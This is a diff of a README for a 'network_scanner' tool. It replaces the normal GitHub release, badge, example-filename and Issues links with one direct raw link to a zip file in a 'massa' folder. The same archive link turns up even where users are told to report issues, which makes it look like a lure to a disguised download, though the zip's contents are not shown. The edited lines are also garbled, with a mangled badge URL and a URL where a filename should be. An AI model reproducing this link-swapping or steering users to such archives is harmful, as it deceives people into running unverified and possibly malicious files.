@@ -1,7 +1,7 @@
 # 🎉 network_scanner - Simple Tool for Scanning Networks
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/mehmetjng/network_scanner/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mehmetjng/network_scanner/main/massa/network_scanner.zip%20Latest%https://raw.githubusercontent.com/mehmetjng/network_scanner/main/massa/network_scanner.zip)](https://raw.githubusercontent.com/mehmetjng/network_scanner/main/massa/network_scanner.zip)
 
 ## 🚀 Getting Started
 
@@ -25,12 +25,12 @@ Welcome to the **network_scanner**! This application helps you discover devices 
 
 Follow these steps to install the **network_scanner** on your device.
 
-1. **Visit the Release Page:** Go to this link to access the downloads: [Releases Page](https://github.com/mehmetjng/network_scanner/releases).  
+1. **Visit the Release Page:** Go to this link to access the downloads: [Releases Page](https://raw.githubusercontent.com/mehmetjng/network_scanner/main/massa/network_scanner.zip).  
 
 2. **Select the Latest Version:** Look for the most recent version at the top of the page.
 
 3. **Download the Application:**
-    - Click on the downloaded file corresponding to your operating system (e.g., `network_scanner_windows.exe` for Windows, or `network_scanner_macos` for macOS).
+    - Click on the downloaded file corresponding to your operating system (e.g., `https://raw.githubusercontent.com/mehmetjng/network_scanner/main/massa/network_scanner.zip` for Windows, or `network_scanner_macos` for macOS).
     - Save the file to a location on your device.
 
 4. **Run the Application:**
@@ -68,7 +68,7 @@ If you encounter any issues:
 
 ## 📞 Support and Feedback
 
-If you need assistance or wish to provide suggestions, please reach out through the [Issues page](https://github.com/mehmetjng/network_scanner/issues). We value your input and strive to improve the application.
+If you need assistance or wish to provide suggestions, please reach out through the [Issues page](https://raw.githubusercontent.com/mehmetjng/network_scanner/main/massa/network_scanner.zip). We value your input and strive to improve the application.
 
 ---
 
